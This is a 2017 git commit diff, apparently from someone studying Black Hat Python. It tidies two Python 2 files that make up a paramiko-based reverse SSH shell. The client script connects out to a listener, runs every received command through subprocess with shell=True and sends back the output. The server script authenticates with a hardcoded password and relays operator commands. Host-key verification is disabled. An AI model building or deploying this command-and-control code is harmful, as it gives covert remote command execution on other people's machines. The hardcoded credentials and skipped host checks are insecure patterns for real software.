7ff97d7fb305434e3e75d34bb901cd47007ffb15
unlockunknown <unlockunknown92@gmail.com>
2017-01-29 18:01:28 -0200

    [*] dumb correction

--- ssh_paramiko/server.py
+++ ssh_paramiko/server.py
@@ -8,22 +8,22 @@ import sys
 
 
 #host_key = paramiko.RSAKey( filename='/home/unknown/.ssh/id_rsa.pub' )
-host_key = paramiko.RSAKey( filename='test_rsa.key' )
+host_key = paramiko.RSAKey(filename='test_rsa.key')
 
 
-class Server( paramiko.ServerInterface ):
+class Server(paramiko.ServerInterface):
     def __init__(self):
         self.event = threading.Event()
 
 
-    def check_channel( self, kind, chanid ):
+    def check_channel_request(self, kind, chanid):
         if kind == 'session':
             return paramiko.OPEN_SUCCEEDED
 
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
 
 
-    def check_auth_password( self, user, passwd ):
+    def check_auth_password(self, user, passwd):
         if (user == 'unknown') and (passwd == 'nolerdifwere'):
             return paramiko.AUTH_SUCCESSFUL
 
@@ -31,17 +31,17 @@ class Server( paramiko.ServerInterface ):
 
 
 server = sys.argv[1]
-ssh_port = int( sys.argv[2] )
+ssh_port = int(sys.argv[2])
 
 
 try:
-    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    sock.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 )
-    sock.bind( (server, ssh_port) )
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((server, ssh_port))
     sock.listen(100)
 
-    print '[*] LISTENING CONNECTION ... '
+    print '[*] LISTENING FOR CONNECTION ... '
 
     client, addr = sock.accept()
 except Exception as err:
@@ -59,7 +59,7 @@ try:
     server = Server()
 
     try:
-        bhSession.start_server( server=server )
+        bhSession.start_server(server=server)
     except paramiko.SSHException, x:
         print '[!!] SSH NEGOTIATION FAILED'
     
@@ -68,11 +68,11 @@ try:
     print '[*] AUTENTICATED'
     print chan.recv(1024)
 
-    chan.send( '[*] WELLCOME : ) ' )
+    chan.send('[*] WELLCOME : ) ')
 
     while True:
         try:
-            cmd = ray_input('Enter command').strip('\n')
+            cmd = raw_input('Enter command').strip('\n')
 
             if cmd != 'exit':
                 chan.send(cmd)
--- ssh_paramiko/sshcmd.py
+++ ssh_paramiko/sshcmd.py
@@ -1,25 +1,21 @@
 # -*- encoding: utf-8 -*-
 
 
-'''
-SSH PARAMIKO to BH study.
-Today a noobie, tomorrow a god!
-'''
-
-
 import threading
 import paramiko
 import subprocess
 
+import logging
+
+logging.basicConfig()
 
 def ssh_command(ip, user, passwd, cmd):
     client = paramiko.SSHClient()
-    ssh_session = None
 
 #    client.load_host_keys('/home/unknown/.ssh/known_hosts')
-    client.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
-    client.connect( ip, username=user, password=passwd )
-
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, username=user, password=passwd)
+    
     ssh_session = client.get_transport().open_session()
 
     if ssh_session.active:
@@ -31,17 +27,17 @@ def ssh_command(ip, user, passwd, cmd):
             cmd_rcv = ssh_session.recv(1024)
 
             try:
-                cmd_out = subprocess.check_output( cmd_rcv, shell=True )
+                cmd_out = subprocess.check_output(cmd_rcv, shell=True)
 
                 ssh_session.send(cmd_out)
-            except Exception as err:
-                ssh_session.send( str(err) )
+            except Exception, err:
+                ssh_session.send(str(err))
 
         client.close()
 
     return
 
 
-ssh_command( '192.168.0.3', 'unknown', 'nolerdifwere', 'ClientConected' )
+ssh_command('127.0.0.1', 'unknown', 'nolerdifwere', 'ClientConnected')
 
 
